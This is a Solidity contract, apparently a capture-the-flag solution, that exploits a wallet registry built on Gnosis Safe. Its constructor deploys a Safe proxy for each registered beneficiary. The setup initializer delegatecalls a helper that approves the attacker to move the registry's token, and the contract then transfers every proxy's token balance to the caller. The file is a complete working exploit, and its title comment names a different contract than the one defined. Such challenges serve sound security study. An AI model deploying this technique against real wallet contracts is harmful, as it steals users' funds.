// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "solady/src/auth/Ownable.sol";
import "solady/src/utils/SafeTransferLib.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "./DelegateCallbackAttack.sol";
import "./WalletRegistry.sol";

/**
 * @title PuppetPoolAttacker
 * @author Igor Coser
 */

contract WalletRegistryAttacker{
    constructor(address _registry, address _factory, address[] memory beneficiaries){
        DelegateCallbackAttack delegateCallback = new DelegateCallbackAttack();
        IERC20 token = WalletRegistry(_registry).token();
        for(uint256 i = 0; i < beneficiaries.length; i++){

            address[] memory owners = new address[](1);
            owners[0] = beneficiaries[i];
            bytes memory approval = abi.encodeWithSelector(
                DelegateCallbackAttack.approve.selector,
                address(token),
                address(this)
            );
            bytes memory initializer = abi.encodeWithSelector(
                GnosisSafe.setup.selector,
                owners,
                1,
                address(delegateCallback),
                approval,
                address(0),
                address(0),
                0,
                address(0)
            );

            address proxy = address(GnosisSafeProxyFactory(_factory).createProxyWithCallback(
                WalletRegistry(_registry).masterCopy(),
                initializer,
                0,
                IProxyCreationCallback(_registry)));
            
            token.transferFrom(proxy, msg.sender, token.balanceOf(proxy));
        }        
    }
}
